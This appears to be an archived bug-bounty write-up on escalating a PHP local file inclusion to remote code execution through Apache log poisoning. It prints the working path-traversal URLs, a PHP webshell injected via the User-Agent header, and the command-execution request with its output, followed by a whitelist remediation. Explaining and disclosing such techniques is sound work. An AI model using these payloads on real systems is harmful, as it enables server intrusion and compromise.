# How I Got a $1000 Bounty for Chaining LFI to RCE via Log Injection

- **Source URL:** https://medium.com/@zoningxtr/how-i-got-a-1000-bounty-for-chaining-lfi-to-rce-via-log-injection-5147552ca2cc?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250802170850/https://medium.com/@zoningxtr/how-i-got-a-1000-bounty-for-chaining-lfi-to-rce-via-log-injection-5147552ca2cc?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10400 (id 10400)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💰 How I Got a $1000 Bounty for Chaining LFI to RCE via Log Injection 🐚🔥

By

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

# 🧠 Introduction

During a responsible disclosure program on **HackerOne**, I discovered a Local File Inclusion (LFI) vulnerability that I later escalated to **Remote Code Execution (RCE)** using a clever log injection technique. This post explains **step-by-step** how I found the bug, exploited it, and earned a **$1000 bug bounty**.

⚠️ **Disclaimer**:

This post is for **educational purposes** only. Only test such techniques in **legally authorized environments**.

# 🔍 Step 1 — Finding the LFI Vulnerability

While browsing through the target web application, I noticed the URL pattern:

`http://example.com/index.php?page=home`
I tested for LFI by replacing `home` with `../../../../etc/passwd`:

`http://example.com/index.php?page=../../../../etc/passwd`
✅ The server responded with the content of `/etc/passwd`, confirming a **Local File Inclusion** vulnerability.

# 🛠️ Step 2 — Understanding the Source Code

The behavior indicated the following vulnerable PHP code:

`php````
<?php
  include($_GET['page']);
?>
```
This allows an attacker to **include arbitrary files** from the server filesystem by manipulating the `page` parameter.

# 🧪 Step 3 — Moving Toward RCE (Remote Code Execution)

Reading files is cool, but **code execution is the jackpot**. To escalate this LFI into RCE, I needed a file that:

1. Is writable by the web server.
2. Contains **user-controllable input**.

That’s where **Apache access logs** come in!

# 📄 Step 4 — Poisoning Apache Logs

Most web servers log **every HTTP request** to a file such as:

- `/var/log/apache2/access.log`
- `/var/log/httpd/access_log`

So I sent the following **user-agent** request:

`http````
GET / HTTP/1.1
Host: example.com
User-Agent: <?php system($_GET['cmd']); ?>
```
Apache happily saved this into the log file.

# 🧨 Step 5 — Including the Log File via LFI

Now I called the LFI again, but this time I included the log file:

`bash``http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id`
✅ Boom! I saw the output of the `id` command on the screen.

# 📸 Screenshot Proof (Simulated)

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
This confirms **arbitrary command execution** on the server via `system()`!

# 🧾 Final Report (HackerOne Submission)

Here’s the actual structure of the report I submitted to HackerOne:

## 🎯 Report Title:

**LFI to RCE via Log Injection on /index.php?page= Parameter**

## 🔗 Target URL:

[http://example.com/index.php?page=...](https://web.archive.org/web/20250802170850/http://example.com/index.php?page=...)

## 📋 Vulnerability Type:

- Local File Inclusion (LFI)
- Remote Code Execution (RCE)

## 🔍 Steps to Reproduce:

1. Navigate to:

`http://example.com/index.php?page=../../../../etc/passwd`
1. ✔️ Confirms LFI.
2. Send the following **request** (burp or curl):

`GET / HTTP/1.1 Host: example.com User-Agent: <?php system($_GET['cmd']); ?>`
Then visit:

`http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id`
✅ Observe command execution:

`uid=33(www-data) gid=33(www-data)`
## 📌 Impact:

- Full remote code execution
- Server compromise
- Potential data exfiltration and lateral movement

## ✅ Severity: Critical

# 💸 Bounty Reward:

After verification by the security team, I was awarded:

*💵 $1000 USD*


# 🛡️ Remediation Suggested:

`php````
// Never trust user input directly
$page = basename($_GET['page']); // Limit path traversal
$whitelist = ['home.php', 'about.php', 'contact.php'];
```
```
if (in_array($page, $whitelist)) {
    include("pages/" . $page);
} else {
    die("Invalid page");
}
```
# 📚 Key Takeaways

- **LFI + writable file = RCE**
- Logs are a great injection vector
- Always sanitize user input
- Disable `allow_url_include` and use strict file paths
- Use bug bounty responsibly — and ethically
